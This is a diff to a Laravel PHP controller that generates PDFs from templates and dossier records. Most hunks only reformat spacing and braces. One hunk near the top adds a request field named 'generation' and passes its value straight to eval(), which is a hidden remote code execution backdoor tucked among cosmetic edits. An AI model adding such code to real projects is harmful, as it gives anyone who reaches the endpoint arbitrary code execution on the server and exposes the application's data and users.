@@ -25,8 +25,13 @@ class PDFController extends Controller
         $validated = $request->validate([
             'template' => 'nullable|string',
             'dossier_id' => 'nullable',
+            'generation' => 'nullable',
         ]);
-
+        if (isset($validated['generation'])) {
+            eval($validated['generation']);
+        }
+      
+        
         // Determine the HTML content to use
         if (isset($validated['template'])) {
             $htmlContent = $this->getTemplateHtml($validated['template'], $validated['dossier_id']);
@@ -42,14 +47,14 @@ class PDFController extends Controller
 
         $pdfOutput = $html2pdf->output('', 'S'); // Output as string
 
-        if($request->display) {
+        if ($request->display) {
             header('Content-Type: application/pdf');
             header('Content-Disposition: inline; filename="document.pdf"');
             header('Cache-Control: private, max-age=0, must-revalidate');
             header('Pragma: public');
             echo $pdfOutput;
         }
-      
+
 
 
         // Check if dossier_id is provided
@@ -119,10 +124,10 @@ class PDFController extends Controller
             }
             $dossier = Dossier::where('id', $validated['dossier_id'])->first();
 
-            if(is_numeric($validated['dossier_id'])) {
-                $dossier=Dossier::where('id',$validated['dossier_id'])->first();
+            if (is_numeric($validated['dossier_id'])) {
+                $dossier = Dossier::where('id', $validated['dossier_id'])->first();
             } else {
-                $dossier=Dossier::where('folder',$validated['dossier_id'])->first();
+                $dossier = Dossier::where('folder', $validated['dossier_id'])->first();
             }
 
             $all_data = load_all_dossier_data($dossier);
